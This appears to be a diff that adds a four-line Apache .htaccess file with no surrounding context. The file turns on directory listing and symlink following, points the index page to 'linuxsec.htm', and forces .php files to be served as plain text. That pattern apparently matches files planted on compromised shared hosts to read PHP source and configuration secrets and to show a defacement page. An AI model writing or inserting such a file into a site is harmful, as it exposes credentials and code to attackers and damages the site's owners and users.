@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex linuxsec.htm
+AddType txt .php
+AddHandler txt .php
